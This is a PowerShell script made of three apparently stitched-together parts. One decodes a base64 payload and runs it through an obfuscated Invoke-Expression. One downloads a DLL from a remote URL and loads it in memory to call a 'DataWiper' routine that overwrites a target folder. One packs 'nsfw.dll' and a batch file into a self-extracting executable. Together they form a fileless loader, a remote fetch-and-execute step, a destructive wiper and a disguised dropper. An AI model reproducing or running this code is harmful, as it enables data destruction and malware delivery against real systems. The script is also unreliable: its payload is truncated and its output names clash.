# Gather host info
$hostinfo = Get-Host
$lang = $hostinfo.CurrentCulture.DisplayName

# Base64 payload (PowerShell command, likely obfuscated)
$t1 = @"
JAAxADIAMwAxACAAPQAgAEcAZQBUAC0ASABvAHMAdAA7ACAAJAA0ADIAMgAxACAAPQAgACQAMQAyADMAMQAuAEM...
...QAAgAHsAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAFAAUwBDAG8AbQBtAGEAbgBkAFAA
YQB0AGgAIAB9AA==
"@

# Decode payload from Base64 (Unicode)
$t2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($t1))

# Obfuscated command to invoke: "Invoke-Expression"
$t3 = "noiSSerpxE-eKOvNI"
$t4 = ([regex]::Matches($t3, '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

# Execute the decoded command
&($t4) $t2

# Confirmation (for lab context)
Write-Host "This has been downloaded off a remote server and executed."


# Download the DLL into memory
$url = "https://drive.google.com/uc?export=download&id=XXXX" # Replace XXXX with real ID
$webClient = New-Object System.Net.WebClient
$dllBytes = $webClient.DownloadData($url)

# Load the DLL into memory using .NET Reflection
$assembly = [System.Reflection.Assembly]::Load($dllBytes)

# Find the class and method (adjust if needed)
$type = $assembly.GetType("DataWiper")  # Must match the class name in the DLL
$method = $type.GetMethod("WipeData")

# Set wipe parameters
$targetPath = "C:\SensitiveData"  # Replace with actual target
$passes = 3                        # Number of overwrite passes

# Invoke method from memory-loaded assembly
$result = $method.Invoke($null, @($targetPath, $passes))

# Output result
if ($result) {
    Write-Host "Wipe operation succeeded."
} else {
    Write-Host "Wipe operation failed."
}

# Powershell to create self-extracting bundle
$files = "nsfw.dll", "launch.bat"
& .\7z.exe a -t7z payload.7z $files
cmd /c "copy /b 7z.sfx + config.txt + payload.7z win32.exe"
Write-Host "✅ Created: DataWiperSFX.exe"
